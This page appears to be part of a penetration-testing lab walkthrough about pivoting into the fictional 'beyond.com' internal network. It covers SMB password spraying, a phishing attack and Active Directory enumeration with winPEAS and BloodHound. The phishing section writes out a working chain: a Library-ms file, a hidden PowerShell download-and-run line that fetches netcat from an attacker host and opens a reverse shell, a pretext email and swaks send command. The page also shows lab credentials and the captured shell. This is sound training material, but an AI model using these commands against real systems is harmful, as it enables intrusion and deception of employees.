---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pivoting to the Internal Network

The attacker has found all they can on `WEBSRV1` and at this point the path to access to the internal network is limited to two options:

1. Leverage the credentials found on `WEBSRV1` to gain access to `MAILSRV1` (the other public machine)
2. Use some client-side attack (e.g. a phishing email) to gain access

## Leveraging Found Credentials

Starting with the first technique seems logical. Recall the `MAILSRV1` machine is running several services:

{% code title="mailsrv1.nmap" %}
```
...
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: SORT RIGHTS=texkA0001 CHILDREN OK NAMESPACE IMAP4rev1 ACL IMAP4 IDLE completed QUOTA CAPABILITY
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
...
```
{% endcode %}

With this in mind, perhaps some of the credentials found in the last section could be used to access the machine via SMB. The first step is to break the `creds.txt` file into a list of users and passwords which are saved into files called `users.txt` and `passwords.txt` respectively.

Then, as seen in [this example](../windows/active-directory/authentication/attacking-ad-authentication/password-attacks.md#crackmapexec), the attacker can use `crackmapexec` to spray these passwords at mailsrv1 via the following command:

{% code overflow="wrap" %}
```bash
crackmapexec smb 192.168.X.242 -u users.txt -p passwords.txt --continue-on-success
```
{% endcode %}

When run there appears to be one set of credentials that worked:

```shell-session
kali@kali:~/beyond$ crackmapexec smb 192.168.225.242 -u users.txt -p passwords.txt --continue-on-success
SMB         192.168.225.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\wordpress:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\wordpress:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\wordpress:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.225.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
```

While `john` is a user for `MAILSRV1` he is not an admin. That said it is still worth seeing if anything can be gained from this.

### Enumerating SMB

With john's credentials `crackmapexec` can be used to list the available SMB shares with the `--shares` flag:

```bash
crackmapexec smb 192.168.X.242 -u john -p "dqsTwTpZPn#nL" --shares
```

When run the attacker only finds the default shares:

```shell-session
kali@kali:~/beyond$ crackmapexec smb 192.168.225.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.225.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.225.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.225.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.225.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.225.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.225.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.225.242 445    MAILSRV1         C$                              Default share
SMB         192.168.225.242 445    MAILSRV1         IPC$            READ            Remote IPC
```

The attacker can attempt to find some valuable files on the share but that path seems unlikely. As shown in this article the --spider flag can be used to check for visible files on a share. The command to enumerate the `C$` share is:

```bash
crackmapexec smb 192.168.225.242 -u john -p "dqsTwTpZPn#nL" --spider 'C$' --regex .
```

* `--spider` indicates which share should be explored
* `--regex` allows the user to patch a RegEx for matching. In this case `.` is passed to match all results

Unfortunately this turns up nothing:

```shell-session
kali@kali:~/beyond$ crackmapexec smb 192.168.225.242 -u john -p "dqsTwTpZPn#nL" --spider 'C$' --regex .
SMB         192.168.225.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.225.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.225.242 445    MAILSRV1         [*] Started spidering
SMB         192.168.225.242 445    MAILSRV1         [*] Spidering .
SMB         192.168.225.242 445    MAILSRV1         [*] Done spidering (Completed in 0.05885910987854004)

```

As `john` is not an admin tools like PsExec are out. That means it is probably time to go phish.

## Phishing for Access

The steps [shown here](../attack-vectors/client-side-attacks/code-execution-via-windows-library-files.md#full-cli-example) will be used to send a phishing email.

First the attacker should create a `mailsrv1/exploit/` directory as well as /http and /webdav subdirectories. The overall plan is to send a phishing email with a malicious attachment as john using the compromised credentials. The attachment will be a Library file that points back to an attacker-hosted WebDAV server. On the WebDAV server is a `.lnk` file that is actually a PowerShell command that will download Netcat and launch a reverse shell using it.

The library file can be created in the exploit directory and will contain:

{% code title="config.Library-ms" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>1</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.45.243</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

The `.lnk` file can be created in the `exploit/` directory but is then copied into `exploit/webdav/`. The command it contains is:

{% code overflow="wrap" %}
```sh
powershell.exe -w hidden -c "iwr 'http://192.168.45.243:8000/netcat_x64.exe' -OutFile $env:userprofile\nc.exe;&(Join-Path $env:userprofile nc.exe) 192.168.45.243 443 -e powershell"
```
{% endcode %}

Next the email's content will be written and saved into a file called body.txt in the `exploit/` directory:

{% code title="body.txt" overflow="wrap" %}
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
{% endcode %}

This email gives a reasonable pretext for the potential victims which dramatically increases the likelihood of a successful phish.

Finally a Netcat .`exe` is placed in `exploit/http/`. When the attack is ready the directory structure will look like this:

```
mailsrv1
└── exploit
    ├── automatic_configuration.lnk
    ├── body.txt
    ├── config.Library-ms
    ├── http
    │   └── netcat_x64.exe
    └── webdav
        └── automatic_configuration.lnk
```

### Launching the Attack

At this point the attack is ready to be launched. In the `exploit/http/` directory the attacker will execute the command:

{% code overflow="wrap" %}
```bash
python3 -m http.server 8000
```
{% endcode %}

Then in a different terminal, in the `exploit/webdav/` directory, the attacker will launch a WebDAV server with the command:

{% code overflow="wrap" %}
```bash
wsgidav --host=0.0.0.0 --port=80 --root=. --auth=anonymous
```
{% endcode %}

Then in another terminal the attacker launches the remote listener:

```bash
rlwrap nc -lvnp 443
```

Then in a final terminal, from the `exploit/` directory, the attacker sends the email:

{% code overflow="wrap" %}
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.211.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
{% endcode %}

When all is said and done the listener catches the shell and the attacker has code execution on `MAILSRV1`:

```shell-session
kali@kali:~/beyond$ rlwrap nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.211.242] 62727
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
...
```

Perfect. It seems `marcus` checks emails on `CLIENTWK1`, and using that machine he ran the malicious .lnk file thus launching a reverse shell. Presumably this is a machine on the internal network and connected to the domain. Now on to enumeration.

## Enumerating the Pivot

Now that the attacker has access to CLIENTWK1 they must enumerate it to see if it has any useful secrets or if it can serve as a pivot to the internal network.

### Machine Enumeration

#### Interfaces

After determining user and hostname it is worth checking the [network interfaces](../windows/privilege-escalation/enumeration/manual-enumeration.md#interfaces) to see where this machine is connected. The command is:

```
ipconfig /all
```

Once run the attacker finds they are connected to the internal network:

```powershell
PS C:\Users\marcus> ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : CLIENTWK1
   Primary Dns Suffix  . . . . . . . : beyond.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : beyond.com

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-86-AD-13
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.167.243(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.167.254
   DNS Servers . . . . . . . . . . . : 172.16.167.240
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

The attacker can now use their reverse shell session to download [winPEAS](../windows/privilege-escalation/enumeration/automated-enumeration.md#winpeas) and use it for enumeration. Once downloaded winPEAS can be run with the command:

```powershell
.\winPEAS.exe > wp_check.txt
```

Once the scan completes the file can be uploaded to the attacker's machine and examined. The first step is checking the operating system info:

```
Basic System Information
Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
```

As was noted earlier, winPEAS can misidentify Windows 11 as Windows 10 Pro so it is worth actually running `systeminfo` to see what the OS is:

```powershell
PS C:\Users\marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

AV was detected on the machine:

```
AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
```

The tool also located some interesting known hosts:

```
Network Ifaces and known hosts
The masks are only for the IPv4 addresses
  
  Ethernet0[00:50:56:BF:FC:36]: 172.16.167.243 / 255.255.255.0
        Gateways: 172.16.167.254
        DNSs: 172.16.167.240
        Known hosts:
          172.16.167.240        00-50-56-BF-35-C4     Dynamic
          172.16.167.254        00-50-56-BF-2D-1B     Dynamic
          ...

DNS cached --limit 70
    Entry                                 Name                                  Data
    dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.167.240
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.167.254
```

Per the DNS cached entries these IP addresses correspond to the domain controller (`172.16.X.254`) and `MAILSRV1`'s internal-facing network interface (`172.16.X.240`).

At this point it is worth creating a `beyond/computers.txt` file which will be used to make notes of machines as they are discovered on the network:

{% code title="computers.txt" %}
```
172.16.167.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.167.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.211.242)

172.16.167.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```
{% endcode %}

### Domain Enumeration

Next, SharpHound will be downloaded to CLIENTWK1 and used to enumerate the domain. The command to launch enumeration will be:

```powershell
SharpHound.exe --CollectionMethods All --OutputPrefix "marcus_mailsrv1"
```

The tool creates a `.zip` that is exported to the attackers machine and examined via BloodHound. Once BloodHound is started and the snapshot uploaded the attacker can begin doing some domain enumeration.

#### Domain Computers

First the attacker will check for domain-connected computers using the [query](../windows/active-directory/enumeration/automated.md#all-users-groups-or-computers):

```
MATCH (c:Computer) RETURN c
```

This reveals 4 machines:

<figure><img src="../.gitbook/assets/AtP-BH_Computers.png" alt=""><figcaption><p>Domain-connected machines</p></figcaption></figure>

3 of the 4 were known before but INTERNALSRV1 is new. The attacker can use the following command to obtain its IP:

```sh
nslookup INTERNALSRV1.BEYOND.COM
```

```powershell
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.184.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.184.241
```

This information is then added to `computers.txt`:

{% code title="computers.txt" %}
```
172.16.167.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.167.241 - INTERNALSRV1.BEYOND.COM

172.16.167.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.211.242)

172.16.167.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```
{% endcode %}

#### Domain Users

A similar query can be used to return all users:

```
MATCH (u:User) RETURN u
```

This reveals all of the domain users:

<figure><img src="../.gitbook/assets/AtP-BH_Users.png" alt=""><figcaption><p>Domain users</p></figcaption></figure>

This reveals that there are 4 users other than the default AD user accounts. This information should be updated in the `beyond/users.txt` file containing a list of usernames:

{% code title="users.txt" %}
```
BECCY
JOHN
DANIELA
MARCUS
```
{% endcode %}

While on this screen the attacker can mark the compromised `john` and `marcus` accounts as owned by right clicking on the nodes and selecting `Mark User as Owned`.

#### Domain Groups and GPOs

In a real scenario the attacker would want to also leverage queries to examine all Groups:

```
MATCH (g:Group) RETURN g
```

And all GPOs:

```
MATCH (g:GPO) RETURN g
```

In the interest of brevity these are skipped as they are not useful in this example.

#### Domain Admins

The pre-built query to find all Domain Admins can be used:

<figure><img src="../.gitbook/assets/AtP-BH_AllDomainAdmins.png" alt=""><figcaption><p>Domain Admins</p></figcaption></figure>

This reveals that the `beccy` user is a Domain Admin.

#### Additional Queries

The attacker will then attempt to run a series of the pre-built queries:

1. `Find Workstations where Domain Users can RDP`
2. `Find Servers where Domain Users can RDP`
3. `Find Computers where Domain Users are Local Admin`
4. `Shortest Path to Domain Admins from Owned Principals`

Unfortunately all of them turn up nothing in the current environment.

#### User Sessions

The user sessions will be enumerated with the [relationship query](../windows/active-directory/enumeration/automated.md#user-sessions):

```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

When run the attacker finds 3 active sessions in the domain:

<figure><img src="../.gitbook/assets/AtP-BH_ActiveSessions.png" alt=""><figcaption><p>Current Active Sessions</p></figcaption></figure>

This reveals 3 active sessions. As expected `marcus` is found to have a session on CLIENTWK1. This is where he clicked the phishing email and the attacker has access.

Interestingly, the previously identified domain administrator account `beccy` has an active session on `MAILSRV1`. If the attacker can manage to get privileged access to this machine, they could potentially extract the NTLM hash for this user.

The user of the last active session (second in screenshot just last to be discussed) is displayed as a SID. BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine. For this session, this means that the local `Administrator` (indicated by RID `500`) has an active session on `INTERNALSRV1`.

#### Kerberoastable Users

The attacker will also use the predefined query to find Kerberoastable Users:

<figure><img src="../.gitbook/assets/AtP-BH_AllKerberoastable.png" alt=""><figcaption><p>Kerberoastable Users</p></figcaption></figure>

This reveals that the users `daniela` and `krbtgt` are Kerberoastable. `krbtgt` is not worth bothering as the hash will likely be uncrackable. But `daniela` could be interesting.

#### Service Principal Names

The attacker may have noticed an SPN attached to the `daniela` user. A [query](../windows/active-directory/enumeration/automated.md#service-principal-names) to check for the presence of SPNs is:

```
MATCH (n:User)WHERE n.hasspn=true RETURN n
```

&#x20;When the Node Info is viewed in BloodHound, `daniela` is found to have the mapped SPN `http/internalsrv1.beyond.com`:

<figure><img src="../.gitbook/assets/AtP-BH_DanielaSPN.png" alt=""><figcaption><p>SPN for daniela</p></figcaption></figure>

The structure of the SPN indicates that there is an internal web application (`http`) hosted on `INTERNALSRV1`.

#### Conclusion

This concludes the domain enumeration from `CLIENTWK1`. The attacker could have used [PowerView](../windows/active-directory/enumeration/manual.md#powerview), [Enumerate-AD](../windows/active-directory/enumeration/manual.md#enumerate-a-d), or [LDAP queries](../windows/active-directory/enumeration/manual.md#powershell) to obtain most of this information. However, in most penetration tests, it is preferable to use BloodHound first as the output of the other methods can be quite overwhelming. It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time. One can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.
